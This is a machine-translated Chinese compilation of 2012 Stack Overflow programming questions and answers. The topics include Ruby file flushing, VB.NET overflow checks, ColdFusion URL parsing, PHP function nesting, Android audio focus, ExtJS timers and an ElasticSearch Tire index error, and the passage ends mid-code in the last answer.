我在 irb 中玩耍以了解冲洗行为。OP 代码的主要问题是 tmpF 文件上没有显式/隐式刷新或关闭。因此，可能小于缓冲区大小的部分写入仅在 tmpF 文件对象被垃圾收集或程序退出时才被写入。tmpF 每次通过循环都会被分配一个新打开的文件对象，因此在之前的迭代中打开的文件只有在 GC 最终确定时才会被刷新。

```
irb(main):001:0> t=File.open('zzz','a+')
=> #<File:zzz>
irb(main):002:0> t.write '123'
=> 3
irb(main):003:0> File.readlines('zzz')
=> []
irb(main):004:0> t=File.open('zzz','a+')
=> #<File:zzz>
irb(main):005:0> t.write '456'
=> 3
irb(main):006:0> File.readlines('zzz')
=> []
irb(main):007:0> t.close
=> nil
irb(main):008:0> File.readlines('zzz')
=> ["456"]
irb(main):009:0> t=File.open('zzz','a+')
=> #<File:zzz>
irb(main):010:0> t.write '789'
=> 3
irb(main):011:0> File.readlines('zzz')
=> ["456"]
irb(main):012:0> t.flush
=> #<File:zzz>
irb(main):013:0> File.readlines('zzz')
=> ["456789"]
irb(main):014:0> GC.start
=> nil
irb(main):015:0> File.readlines('zzz')
=> ["456789123"] 
```

# .net - VB.NET 处理大整数

> ID：10220788
> 
> 赞同：-1
> 
> 时间：2012-04-19T02:18:50.707
> 
> 标签：.net, vb.net, visual-studio

所以我正在制作一个文件加密器，以便我可以加密我正在制作的 VB.NET 应用程序，这样人们就无法反编译它。我在 C# 中制作了这个并将其转移到 VB.NET，在 C# 中一切正常，但是一旦我在 VB.NET 中重新编写了代码，我在我的 RC4 加密方法中得到了这个错误：

```
'Arithmetic operation resulted in an overflow.' 
```

错误发生在这里：

```
Dim t As Int64 = (s(i) + s(j)) Mod 256 
```

这与上面 c# 中的代码相同：

```
int t = (s[i] + s[j]) % 256; 
```

无论如何，是否有错误的计算？为什么它可以在 C# 中工作，但不能在 VB.NET 中工作？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-19T03:00:49.623

检查 VB.NET 项目中的高级编译选项（项目属性 -> 编译 -> 高级编译选项...）。与您的 C# 项目进行比较。VB 版本可能会检查整数溢出，而 C# 版本不会。

当我在 VB 中运行测试时，此代码会生成异常：

```
Dim x As Int16 = Int16.MaxValue
Dim y As Int16 = Int16.MaxValue

Dim t As Int64 = (x + y) Mod 256 
```

但是这段代码没有：

```
Dim t As Int64 = (32767 + 32767) Mod 256 
```

如果我关闭溢出检查，则两组代码都将完成而不会出错。

检查等式中每个变量的值，以查看是否可能基于加法部分发生溢出。加法运算结果的数据类型基于运算中涉及的变量/值的数据类型。对于派生数据类型，这些值可能会产生太大的结果。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T02:44:44.283

在 .Net 4.0 中有一种称为 BigInteger 的新类型：http: [//msdn.microsoft.com/en-us/library/system.numerics.biginteger.aspx](http://msdn.microsoft.com/en-us/library/system.numerics.biginteger.aspx)

虽然我认为你真正想要的解决方案是混淆你的代码，所以即使有人反编译他们也无法阅读它：Visual Studio > Tools Menu > Dotfuscator

如果您想完全保护您的代码，您将不得不为[Remotesoft 的 Salamander 之类的东西付费](http://www.remotesoft.com/salamander/)

# string - AI - 字符串/文本分类/分类（例如，字符串/文本被分类为公司名称）

> ID：10220790
> 
> 赞同：3
> 
> 时间：2012-04-19T02:19:21.207
> 
> 标签：string, nlp, artificial-intelligence, machine-learning, classification

我的问题是过滤掉表中所有的人名，即公司、学校、机构的名称将留在数据库中。

我尝试了一个简单的解决方案，其中给出了公司、学校等名称的列表。我在那里搜索了最常用的术语。（注意：我没有搜索名称中的常用字符串，因为那样会花费很多）。我为这些术语以及最常见的子字符串分配了权重。有了这个，如果字符串中有一个 corp, inc, school, univ，那么它很可能不是一个人的名字。

现在，我的问题是如何将其变成人工智能。此外，我必须使仅公司、仅学校等的分类变得更容易。

例如

```
XYZ Brewery Corporation -> company
Harvard University -> school
Department of Health -> government agency 
```

我知道的唯一 AI 技术是 Naive-Bayes、K-Means、Hierarchical、FCM、ANN。这些技术通常会得到数值，所以，我不知道如何将其变成人工智能。我所知道的唯一能广泛处理字符串的 AI 技术是 Levenshtein、Stemming、Needleman-Wunch 和 Jaro-Winkler。

我的第一种方法不正确吗？怎样才能融入我所知道的技术？我必须学习一项新技术吗？因为我还是一名学生，所以我基本上是 AI 新手。但是，这不是作业，而是公司项目（实际上我是我们小组中唯一的计算机科学专业，所以对我来说很重）。顺便说一句，如果您对我使用的语言感到好奇，我正在使用 C#，因为我打算将它制作成一个独立的应用程序，并且用户正在使用 Windows。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-19T04:58:30.300

这个问题通常被称为[命名实体识别（NER）](http://en.wikipedia.org/wiki/Named_entity_recognition)。SharpNLP[项目](http://sharpnlp.codeplex.com/)是 NLP 算法的 C# 库，包括 NER。它似乎完全没有记录，尽管它是 Apache 的 OpenNLP 的 C# 端口，它有[关于名称查找的文档](http://opennlp.apache.org/documentation/1.5.2-incubating/manual/opennlp.html#tools.namefind)；SharpNLP 的界面大概是类似的。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-19T05:13:00.743

不要只是跳入花哨的机器学习算法。你的常识和直觉可以让你走得很远。
您拥有大量实体列表的想法非常好，如果您能找到世界上所有高等教育机构的列表，那么对于学校来说可能效果很好。如果您可以将这样的列表汇总在一起，那么它不太可能包含世界上**每**所大学，但对于所有实际目的来说可能已经足够了。
从您已经编译的列表中，您可以计算每个实体类的每个一元组（即单词）和二元组（即连续的单词对）出现的次数，并看到某些短语强烈倾向于特定类（例如'department of' 可能主要出现在政府机构中，'inc'、'ltd'、'& co.' 可能只出现在公司中，'university'、'school'、'college' 可能主要出现在学校中）。您可以将这些想法形式化为朴素贝叶斯模型，但如果有一个更简单的规则，只检查大型 if-then 语句中的某些短语，可能会让您完成 90% 的工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-19T04:50:16.747

您可能想看看 Febrl 项目。

> [Febrl](http://sourceforge.net/projects/febrl/)（可自由扩展的生物医学记录链接）对一个或多个不共享唯一记录密钥或标识符的文件或数据源进行数据标准化（分段和清理）和概率记录链接（“模糊”匹配）。

特别是查看文档档案中名为*biomed2002hmm.pdf*的文件。它讨论了使用词汇标记化和隐马尔可夫模型来识别名称和地址的模式。

提出的想法可以应用于您识别个人名称与企业名称的问题。该项目包括所描述技术的代码示例（虽然是 Python，而不是 C#）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-06-12T01:10:57.610

python 库[probablepeople](https://github.com/datamade/probablepeople)使用条件随机场模型来执行此操作。（我是这个项目的贡献者），

# coldfusion - 从使用 CFML 存储为字符串的 url 中解析特定变量

> ID：10220795
> 
> 赞同：3
> 
> 时间：2012-04-19T02:20:26.397
> 
> 标签：coldfusion, railo

我想从存储为字符串的 url 中解析特定的 url 变量键值。看来您可以在 ACF 下使用底层的 java 库 Coldfusion.util.HTMLTools，但我也需要它在 Railo 下工作。还有另一种方法，还是使用正则表达式是最好的答案？

我正在尝试检索 url 变量键的值，而不使用 url 格式的锚点，如下例所示。 [http://example.com?key=134324625625435#gid=0](http://example.com?key=134324625625435#gid=0)

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-23T13:38:13.600

我发布了对斯科特答案的评论，但它太长了，所以......

约翰写道：

> 运行以下示例，我最终得到的值为 0，但我认为它应该是整个键值？

```
<cfoutput>
    <cfset theUrl = "https://docs.google.com/spreadsheet/ccc?key=0AthiZNZ73LBndUzRTUkplbmNhYWc##gid=0" />
    <cfset theUrl = listRest(theUrl, "?")>
    <cfloop list="#theUrl#" index="URLPiece" delimiters="&">
        Key: #listFirst(urlPiece, "=")# Value: #listLast(urlPiece, "=")# <br />
    </cfloop>
</cfoutput> 
```

该示例 URL 失败的原因是它包含一个页面段（哈希后的位），需要在解析查询字符串之前将其剥离。

通过将键/值部分包装在`UrlDecode`.

另外，值中有一个等号是完全可以接受的，所以`?key==`应该`=`作为值返回，这意味着将 a 更改`ListLast`为 a`ListRest`并将设置`includeEmptyFields`为 true。

此外，如果您有一个查询字符串，`?a&b`那么约定是将值设置为任一`true`字符串或空字符串 - 当前代码设置为键名，这是错误的。

总之，这里有一个函数：

```
<cffunction name="getParamsFromUrlString" returntype="Struct" output=false >
    <cfargument name="UrlString" type="String" required />
    <cfargument name="Separator" type="String" default="?" />
    <cfargument name="Delimiter" type="String" default="&" />
    <cfargument name="AssignOp"  type="String" default="=" />
    <cfargument name="EmptyVars" type="String" default="" />

    <cfset var QueryString = ListRest( ListFirst( Arguments.UrlString , '##' ) , Arguments.Separator ) />
    <cfset var Result = {} />

    <cfloop index="local.QueryPiece" list=#QueryString# delimiters="#Arguments.Delimiter#">

        <cfif NOT find(Arguments.AssignOp,QueryPiece)>
            <cfset Result[ UrlDecode( QueryPiece ) ] = Arguments.EmptyVars />
        <cfelse>
            <cfset Result[ UrlDecode( ListFirst(QueryPiece,Arguments.AssignOp) ) ]
                =  UrlDecode( ListRest(QueryPiece,Arguments.AssignOp,true) ) />
        </cfif>
    </cfloop>

    <cfreturn Result />
</cffunction> 
```

它可以简单地使用：

```
 <cfset theUrl = "https://docs.google.com/spreadsheet/ccc?key=0AthiZNZ73LBndUzRTUkplbmNhYWc##gid=0" />
    <cfset Data = getParamsFromUrlString( theUrl ) />
    <cfdump var=#Data# /> 
```

或者它可以用于复杂的非标准 URL 字符串，如下所示：

```
 <cfset theUrl = "https://somewhere/index.jsp;x:145;y:54;z:1;f;d:%23%23;w:%3B" />
    <cfset Data = getParamsFromUrlString( theUrl , ';' , ';' , ':' , 'true' ) />
    <cfdump var=#Data# /> 
```

并且（希望）介于两者之间。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-19T03:22:18.647

作为查询字符串的一部分传递的任何变量都在 URL 范围内可用 - 这是一个“内置”结构。

这是一些示例代码，它们会将这些变量放在您的示例中：

```
<cfoutput>
    #url.id# <br />
    #url.key# <br />
    #url.output#
</cfoutput> 
```

添加到我的答案以匹配新信息和 mbrusche 的示例：

```
<cfset urlString = listRest( urldata, "?" ) />
<cfoutput>
    <cfloop list="#urlString#" index="URLPiece" delimiter="&">
        Key: #listFirst( urlPiece, "=" )# Value: #listLast( urlPiece, "=" (# <br />
    </cfloop>
</cfoutput> 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-23T13:50:59.133

刚刚重新阅读了这个问题，如果您只处理一个特定的变量，您可以使用简单的正则表达式轻松地做到这一点：

```
<cfset Value = rematch( '[?&]key=[^&##]+' , TheUrl ) />
<cfset Value = UrlDecode( ListRest( Value[1] , '=' , true ) ) /> 
```

（如果您需要更通用的解决方案，另一个答案当然仍然有用。）

# c# - 正则表达式替换字符串中的子字符串

> ID：10220797
> 
> 赞同：0
> 
> 时间：2012-04-19T02:20:27.667
> 
> 标签：c#, regex

我认为这个问题已经被问过很多次了，但我还没有找到一个具有 C# 风格的问题（或者我不知道如何将它从 python/perl 等转换为 C# ......）。我正在创建一个函数，我希望它从字符串中删除匹配的字符串。

我希望它匹配整个单词和部分单词......这是我到目前为止匹配整个单词的内容：

```
public string regExRemove(string text, List <String> words)
    {

        string pattern =
            @"(?<=\b)(" +
            String.Join(
                "|",
                words
                    .Select(w => Regex.Escape(w))
                    .ToArray()) +
             @")(?=\b)";
        var regex = new Regex(pattern);
        string strReturn = regex.Replace(text, "");

        return strReturn;

    } 
```

我从另一个stackoverflow问题中得到了这个。正如我所说，这是匹配整个单词。我希望它匹配字符串“文本”中任何位置的“单词”列表，然后将其删除。

例如，我想从字符串中删除单词 Apples，Peaches，它们将出现在单词列表中，例如 I have [apples] I have -apples I have apples and Peaches I Peaches have Apples I.Peaches have[Apples]

在单词列表中，我还将传递特殊字符以删除即“[”，但我也想替换“。” 带空格等...

所以列表变成了我有我有我有我有

我怎样才能修改上面的正则表达式来做到这一点？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T03:38:14.380

这个怎么样？

```
 public string stripify(string text, List<string> words)
    {
        var stripped = words.Aggregate(text, (input, word) => input.Replace(word, ""));
        return stripped.Replace('.', ' ');
    } 
```

# ios - 故事板 - 在 2 个关卡之间切换

> ID：10220798
> 
> 赞同：0
> 
> 时间：2012-04-19T02:20:32.327
> 
> 标签：ios, storyboard

我有以下简单的应用程序故事板。我想做的就是直接从 Sub 1 屏幕转到 Sub 2，反之亦然。我真的需要去主屏幕来实现这一点吗？

什么是“替换”序列？或者我还能做些什么来实现这一目标？

（可惜我不能发图）

导航控制器 -> 主视图控制器 -> “子 1” 视图控制器 -> “子 2” 视图控制器

在 Sub1 和 Sub2 上，我都有按钮可以连接到两者。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T02:22:45.493

我可能没有正确理解这个问题，但为什么不使用模态转场呢？

在 xcode 中制作一个新的 iPhone 应用程序并选择 Utility app 以查看预制示例。

# php - 将 PHP 函数嵌套在 PHP 函数中的 PHP 函数中。不好的做法？

> ID：10220807
> 
> 赞同：2
> 
> 时间：2012-04-19T02:21:44.997
> 
> 标签：php, function, nested

是否有原则建议不要做以下事情：

```
mysql_real_escape_string(trim(str_replace($var, "black", "<body text='%body%'>"))); 
```

如果这样的事情应该是禁止的，那么这可以接受吗？

```
$var = trim($var);
$var = str_replace($var, "black", "<body text='%body%'>");
$var = mysql_real_escape_string($var); 
```

或者这也是一种不好的做法，就像我在上面所做的那样，在一个类似的地方调用和执行同一个变量？这样做会更好：

```
$var1 = trim($var);
$var2 = str_replace($var1, "black", "<body text='%body%'>");
$var3 = mysql_real_escape_string($var2); 
```

我一直想知道这个！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-19T02:27:44.003

我认为正常的做法是像第一个例子一样“嵌套”函数。

有几个原因，但大多数情况下它表明所有事情都以特定顺序发生在同一个对象上，中间没有任何事情发生。

话虽如此，如果您不确切知道要做什么，您可能希望从第二个示例开始，这样您就可以轻松返回并添加函数。

基本上，第一个是首选，最终更常见（我认为），第二个有利于测试和开发，第三个只是浪费资源（虽然很小，但没有必要）。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-19T02:40:50.870

嵌套函数很好——只要你考虑到可读性。在这个相当简单的示例中，需要花费大量精力来解析语句：

```
mysql_real_escape_string(trim(str_replace($var, "black", "<body text='%body%'>"))); 
```

如果您决定使用嵌套函数，还可以使用智能缩进来更轻松地查看正在发生的事情：

```
mysql_real_escape_string(
  trim(
    str_replace(
       $var, 
       "black", 
       "<body text='%body%'>"
))); 
```

*   每个函数参数都在它自己的缩进行上（`trim`并且`str_replace`都被用作函数参数，就像`$var`和`"black"`一样`"<body text='%body%'>"`）
*   结尾`)));`清楚地界定了函数嵌套的结束位置。它还提供了一个快速的语法校验和（计算左括号的数量并确保它们与结尾处的右括号的数量相匹配）。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-19T02:24:59.610

在我看来，使代码简单易读有很长​​的路要走。当我必须像您的第一个示例那样阅读代码时，我真的不喜欢它。通常是有人试图展示他们可以做出多么复杂的事情。

我认为无论哪种方式你都有它比第一个例子更好。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-04-19T02:33:54.223

你所有的例子都很好；它们之间并没有太大的区别。如果你想让你的第一个例子更具可读性，你可以缩进它：

```
mysql_real_escape_string(
  trim(
    str_replace($var, "black", "<body text='%body%'>"))); 
```

将部分结果分配给临时变量，就像你的第二个和第三个例子一样，也很好。但如果你给变量起有意义的名字，它可能会更有用：

```
$trimmed = trim($text);
$html = str_replace($trimmed, "black", "<body text='%body%'>");
$sql = mysql_real_escape_string($html); 
```

顺便说一句，您的第一个示例以与其他示例不同的顺序调用函数。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-04-19T02:32:52.723

我在不同方面同意 sloopjohnB 和 Jon 的观点。我相信第一个例子是完全有效的，通常是常见的做法。如果它是其他人将要阅读和处理的代码，那么在某些人看来，您可能会试图通过这样做来展示您的编码知识，但这是正常的做法，如果代码仅供您查看和处理，那么无论如何，如果它对您来说很舒服，请使用它。

就我个人而言，我更喜欢第二种选择。让您更清楚地了解正在发生的事情以及您正在执行的步骤。还为您提供添加或更改功能的选项，在正确的位置/顺序中，更容易。如果你需要在第一个例子中添加一个函数，你很容易忘记一个括号或者把函数或括号放在错误的位置，真的让你失望。

# javascript - Mootools中类的选项中的对象？

> ID：10220808
> 
> 赞同：0
> 
> 时间：2012-04-19T02:21:53.523
> 
> 标签：javascript, class, object, mootools, options

`options`是否可以在 Mootools 的类中定义对象？

我正在尝试将日期对象访问到`options`类实例的对象。

```
options: {
    date: new Date().increment('year')
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T08:15:17.227

呃，不知道这个问题有什么意义。尝试它会容易得多。

```
var f = new Class({

    options: {
        date: new Date().increment('year')
    },

    Implements: [Options],

    initialize: function(options) {
        this.setOptions(options);
        console.log(this.options.date);
    }

});

new f(); // now + 1 yr. 
```

所以是的，这是可能的。您可以传递任何对象，包括日期 - 只要它在定义时可用并且不尝试引用类原型或实例本身，这可能会导致问题。

请记住，日期将在原型上静态设置。因此，如果您这样做了`date: new Date()`，然后在 5 分钟后实例化该类，而无需通过选项传递新日期，它将引用定义类时的日期，而不是实例化。prolly 对您来说并不重要，因为您在一年后的日期之后。

[http://jsfiddle.net/qV3JM/](http://jsfiddle.net/qV3JM/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T08:51:41.047

```
Implements:[Options], 
```

必须插入“new Class({”之后的第一行

和：

```
options:{ date: new Date().getFullYear() + 1, }, 
```

# apache - 使用 htaccess 重写和重定向这个 url

> ID：10220812
> 
> 赞同：0
> 
> 时间：2012-04-19T02:22:28.790
> 
> 标签：apache, .htaccess, mod-rewrite, url-rewriting

我想重写并重定向以下网址：

```
/display/0123456789/product-name 
```

到

```
/product-name/display/0123456789 
```

我尝试了以下方法，但它对我不起作用。

```
RewriteRule ^/([^/]+)/display/([0-9+]) /display/([0-9])/([^/]+) [L]

Redirect 301 /display/([0-9+])/([^/]+) /([^/]+)/display/([0-9+]) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T04:27:49.437

你可以这样做：

```
RewriteEngine on
RewriteRule ^display/([0-9]+)/([A-z\-]+) /$2/display/$1
Redirect 301 /display/([0-9+])/([^/]+) /([^/]+)/display/([0-9+]) 
```

并且，在[htaccess tester](http://htaccess.madewithlove.be/)上测试过的图像。

![重写规则测试](../Images/ec46dc113a735d5f0bd5291b7cc31a9d.png)

# android - AudioFocusChangeListener 无法监听

> ID：10220816
> 
> 赞同：2
> 
> 时间：2012-04-19T02:22:58.500
> 
> 标签：android, audio, listener, multimedia, android-audiomanager

我在使用 AudioFocusChangeListener 时遇到了问题，但仍然无法收听音频焦点的变化。有人可以帮我找出原因吗？这是我所做的：

1.  在我的 FM 应用程序中，当 FM 在 startFM 中启动时，我放置`requestAudioFocus()`以获取资源：

    ```
    int result = mAudioManager.requestAudioFocus(mAudioFocusListener, AudioManager.STREAM_FM,AudioManager.AUDIOFOCUS_GAIN_TRANSIENT);
    if (result == AudioManager.AUDIOFOCUS_REQUEST_GRANTED) {
        Log.d(LOGTAG, "Successfull to request audioFocus listener");
    } else {
        Log.d(LOGTAG, "Failure to request focus listener");
    } 
    ```

2.  在退出应用程序时`onDestroy()`，我曾经`abandonAudioFocus()`释放资源。

3.  成员变量`mAudioFocusListener`如下：

    ```
    private OnAudioFocusChangeListener mAudioFocusListener = new OnAudioFocusChangeListener() {
    public void onAudioFocusChange(int focusChange) {
        switch (focusChange) {
            case AudioManager.AUDIOFOCUS_LOSS:
                Log.v(LOGTAG, "AudioFocus: received AUDIOFOCUS_LOSS, turning FM off");

                if (isFmOn()) {
                    fmOff();
                }
                break;
            case AudioManager.AUDIOFOCUS_LOSS_TRANSIENT_CAN_DUCK:
                Log.v(LOGTAG, "AudioFocus: received AUDIOFOCUS_LOSS_TRANSIENT_CAN_DUCK");

                if (isFmOn()) {
                    Log.d(LOGTAG, "AudioFocus: FM is on, turning off");
                    mute();
                    stopFM();
                }
                break;
            case AudioManager.AUDIOFOCUS_LOSS_TRANSIENT:
                Log.v(LOGTAG, "AudioFocus: received AUDIOFOCUS_LOSS_TRANSIENT");

                if (isFmOn()) {
                    Log.d(LOGTAG, "AudioFocus: FM is on, turning off");
                    mute();
                    stopFM();
                }
                break;
            case AudioManager.AUDIOFOCUS_GAIN:
                Log.v(LOGTAG, "AudioFocus: received AUDIOFOCUS_GAIN");

                if (isFmOn()) {
                    Log.d(LOGTAG, "AudioFocus: FM is off, turning back on");
                    unMute();
                    startFM();
                }
                break;
            default:
                Log.e(LOGTAG, "Unknown audio focus change code " + focusChange);
        }
    }
    }; 
    ```

4.  `AudioForcus`根据日志，它打印“Successfull to request audioFocus listener”，但在警报开启或其他音频更改事件时不打印任何更改日志。谁能弄清楚它有什么问题？

5.  另一方面，我将日志放入 AudioService.java 和 AudioManger.java，在 AudioService.java 中，requestAudioFocus(): if (!mFocusStack.empty() && (mFocusStack.peek().mFocusDispatcher != null)) {

    ```
     try {  

                mFocusStack.peek().mFocusDispatcher.dispatchAudioFocusChange(  

                         -1 * focusChangeHint, // loss and gain codes are inverse of each other  

                         mFocusStack.peek().mClientId);  // This doesn't excute

            } catch (RemoteException e) {  

                Log.e(TAG, " Failure to signal loss of focus due to "+ e);  
                e.printStackTrace();  

             }  

         } 
    ```

6.  在 AudioManager.java 中，这里也不执行： private IAudioFocusDispatcher mAudioFocusDispatcher = new IAudioFocusDispatcher.Stub() {

    ```
    public void dispatchAudioFocusChange(int focusChange, String id) {  

        Message m = mAudioFocusEventHandlerDelegate.getHandler().obtainMessage(focusChange, id);  

         mAudioFocusEventHandlerDelegate.getHandler().sendMessage(m);  

     } 
    ```

这就是我的全部问题。谁能告诉我为什么这个听众不能听警报事件和其他音频焦点改变的事件？顺便说一句，我怎样才能成功收听这些事件？也许我错过了一些步骤或使用了不正确的方式？非常感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-28T15:53:28.407

尝试这个：

```
private class MyService extends Service implements AudioManager.OnAudioFocusChangeListener {
    public void onAudioFocusChange(int focusChange) {
        switch (focusChange) {
            case AudioManager.AUDIOFOCUS_LOSS:
                Log.e(TAG, "AudioFocus: received AUDIOFOCUS_LOSS, turning FM off");
                break;
            case AudioManager.AUDIOFOCUS_LOSS_TRANSIENT_CAN_DUCK:
                Log.e(TAG, "AudioFocus: received AUDIOFOCUS_LOSS_TRANSIENT_CAN_DUCK");
                break;
            case AudioManager.AUDIOFOCUS_LOSS_TRANSIENT:
                Log.e(TAG, "AudioFocus: received AUDIOFOCUS_LOSS_TRANSIENT");
                break;
            case AudioManager.AUDIOFOCUS_GAIN:
                Log.v(TAG, "AudioFocus: received AUDIOFOCUS_GAIN");
                break;
            default:
                Log.e(TAG, "Unknown audio focus change code " + focusChange);
        }
    }

    public IBinder onBind(Intent intent) {
        return null;
    }
} 
```

和...

```
mAudioManager.requestAudioFocus(new MyService(), AudioManager.STREAM_MUSIC, AudioManager.AUDIOFOCUS_GAIN); 
```

它对我有用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-16T15:14:42.417

鹿编码器，

我相信，如果您请求 AudioManager.STREAM_MUSIC 类型的音频焦点，您只会收到影响此特定音频流的事件。

```
mAudioManager.requestAudioFocus(new MyService(), AudioManager.STREAM_MUSIC, AudioManager.AUDIOFOCUS_GAIN); 
```

警报和通知在单独的音频流上进行管理，例如 AudioManager.STREAM_NOTIFICATION、AudioManager.STREAM_ALARM、AudioManager.STREAM_RING 等...

# extjs - 调用 Ext.TaskManager.stop() 方法时无法停止正在运行的任务

> ID：10220818
> 
> 赞同：1
> 
> 时间：2012-04-19T02:23:13.670
> 
> 标签：extjs, task, taskmanager

我设置了一个消息框来显示当前时间。定时器间隔设置为 1000，有 2 个按钮来启动和停止“定时器”。当单击“停止”按钮时，它会调用 Ext.TaskManager.stop 方法并将消息框中的文本更新为“暂停”。但是，当单击“停止”按钮并且文本变为“暂停”仅一秒钟时，它又变回显示当前时间。当我尝试使用 Ext.TaskManager.stopAll(); 而不是 Ext.TaskManager.stop(task)，它可以工作！为什么？我的代码如下：

```
<script type="text/javascript">
Ext.onReady (function(){
            var config={
            msg:'Display Time',
            modal:true,
            buttons:Ext.Msg.OKCANCEL,
            fn:displayTime
            }

        Ext.MessageBox.msgButtons[0].setText('Start');
        Ext.MessageBox.msgButtons[3].setText('Stop');                
        Ext.MessageBox.show(config); 
        function displayTime(id){
            if(id=='ok'){
                var task = {
                    run:function(){Ext.MessageBox.updateText ('????:' + Ext.util.Format.date(new Date(), 'Y-m-d g:1:s A'));},        
                    interval:1000                            
                    }                   
                Ext.TaskManager.start(task);
            }             
            else {
                Ext.MessageBox.updateText('Paused!');
                Ext.TaskManager.stop(task);
            }    
    };       
    }); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T02:32:40.027

该任务是在 if 中定义的，所以当 else 被击中时，它实际上正在运行`Ext.TaskManager.stop()`，这不会停止您的任务。将您的任务移到函数声明之外。

```
 var task = {
            run: function () {
                Ext.MessageBox.updateText('????:' + Ext.util.Format.date(new Date(), 'Y-m-d g:1:s A'));
            },
            interval: 1000
        }

        function displayTime(id) {
            if (id == 'ok') {
                Ext.TaskManager.start(task);
            } else {
                Ext.MessageBox.updateText('Paused!');
                Ext.TaskManager.stop(task);
            }
        }; 
```

# iphone - 谁能告诉我为什么我的代码无法创建数据库和表，然后将数据存储在其中。

> ID：10220819
> 
> 赞同：2
> 
> 时间：2012-04-19T02:23:18.333
> 
> 标签：iphone, objective-c, sqlite, cllocationmanager

所以我的代码是假设创建一个数据库和表，然后将我的位置数据存储在表中。它击中了我制作的所有正确日志，例如“创建的表”和“插入的位置”，但是当我去查找文件时，它要么 (a) 不存在，要么 (b) 存在但其中没有位置数据。

我开始使用 CoreData，但它很快变成了一场噩梦，所以我改为直接使用 sqlite。

```
 - (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
    {

        locationManager =[[CLLocationManager alloc] init];

        locationManager.delegate = self; 
        locationManager.desiredAccuracy = kCLLocationAccuracyBest;
        locationManager.distanceFilter = 10;
        [locationManager startUpdatingLocation]; 

// Create a string containing the full path to the bold2.db inside the documents folder
    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *documentsDirectory = [paths objectAtIndex:0];
    NSString *databasePath = [documentsDirectory stringByAppendingPathComponent:@"bold2.sql"];

    // Check to see if the database file already exists
    bool databaseAlreadyExists = [[NSFileManager defaultManager] fileExistsAtPath:databasePath];

    // Open the database and store the handle as a data member
    if (sqlite3_open([databasePath UTF8String], &databasehandle) == SQLITE_OK)
    {
        // Create the database if it doesn't yet exists in the file system
        if (!databaseAlreadyExists)
        {
            // Create the LOCATION table
            const char *sqlStatement = "CREATE TABLE IF NOT EXISTS LOCATION (ID INTEGER PRIMARY KEY AUTOINCREMENT, latitude DOUBLE, longitude DOUBLE, timeStamp DATE)";
            char *error;
            if (sqlite3_exec(databasehandle, sqlStatement, NULL, NULL, &error) == SQLITE_OK)
          {
                NSLog(@"Created Table");
                 }
              } 
```

这是我获取新位置并将其插入数据库的位置委托。奇怪的是它实际上命中了“插入的位置”日志。

```
 -(void) locationManager: (CLLocationManager *) manager
    didUpdateToLocation: (CLLocation *) newLocation
           fromLocation: (CLLocation *) oldLocation
{

    NSString *insertStatement = [NSString stringWithFormat:@"INSERT INTO location (latitude, longitude, timeStamp) VALUES (%g, %g, %g)",newLocation.coordinate.latitude, newLocation.coordinate.longitude, newLocation.timestamp];    
    char *error;   
    if ( sqlite3_exec(databasehandle, [insertStatement UTF8String], NULL, NULL, &error) == SQLITE_OK)
    {
        NSLog(@"Location inserted. %g", newLocation.coordinate.latitude);
    }    

    else NSLog(@"Error: %s", error);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-23T21:21:44.953

我解决了。由于我正在远程处理到 minimac，因此隐藏了 db 的文件路径。我刚刚将正确的文件路径粘贴到 go to folder 并找到了正确的文件。

# ruby-on-rails - Ruby：ElasticSearch + 轮胎错误 Tire::Search::SearchRequestFailed - IndexMissingException？

> ID：10220825
> 
> 赞同：6
> 
> 时间：2012-04-19T02:24:36.947
> 
> 标签：ruby-on-rails, ruby, mongodb, elasticsearch, tire

我想使用 ElasticSearch + Tire 来搜索存储在 MongoDB 中的内容。

但是，当我尝试执行搜索时出现以下错误：

**轮胎::Search::SearchRequestFailed 在 SearchController#index**

```
404 : {"error":"IndexMissingException[[events] missing]","status":404} 
```

据我了解，这告诉我事件缺少索引，即使我已经告诉它在运行时生成它们`db:setup`。

模型：

```
class Event
  include Mongoid::Document
  include Mongoid::Timestamps 

  include Tire::Model::Search
  include Tire::Model::Callbacks

  field :name, :type => String
  field :description, :type => String
  field :started_at => Time
  field :ended_at => Time

  def to_indexed_json
    self.as_json
  end
end 
```

控制器：

```
 def search
    Event.tire.search(params[:q])
  end 
```

关于如何解决这个问题的任何想法？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-06-02T06:25:35.610

...甚至更好，只需运行：

```
rake environment tire:import CLASS=Event FORCE=true 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-01T15:23:28.557

设置一个初始化程序（以下内容将在您的机器上本地工作，也可以在带有盆景插件的 heroku 上工作，以防万一......）：

```
# config/initializers/bonsai.rb

if ENV['BONSAI_INDEX_URL']
  Tire.configure do
    url "http://index.bonsai.io"
  end
  BONSAI_INDEX_NAME = ENV['BONSAI_INDEX_URL'][/[^\/]+$/]
else
  app_name = Rails.application.class.parent_name.underscore.dasherize
